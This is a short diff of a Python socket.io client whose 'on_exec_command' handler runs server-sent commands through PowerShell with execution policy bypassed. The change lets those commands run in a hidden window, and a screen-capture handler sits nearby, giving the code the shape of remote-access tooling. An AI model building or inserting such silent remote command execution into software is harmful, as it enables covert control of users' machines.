@@ -161,17 +161,17 @@ def on_exec_command(data):
     if cmd_str.lower().startswith("powershell"):
         subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
     else:
-        subprocess.Popen(
-            [
-                "powershell.exe",
-                "-NoProfile",
-                "-ExecutionPolicy",
-                "Bypass",
-                "-Command",
-                cmd_str,
-            ],
-            creationflags=creation_flags,
-        )
+        ps_cmd = [
+            "powershell.exe",
+            "-NoProfile",
+            "-NonInteractive",
+            "-ExecutionPolicy",
+            "Bypass",
+        ]
+        if not visible:
+            ps_cmd.extend(["-WindowStyle", "Hidden"])
+        ps_cmd.extend(["-Command", cmd_str])
+        subprocess.Popen(ps_cmd, creationflags=creation_flags)
 
 
 @sio.on("set_capture")
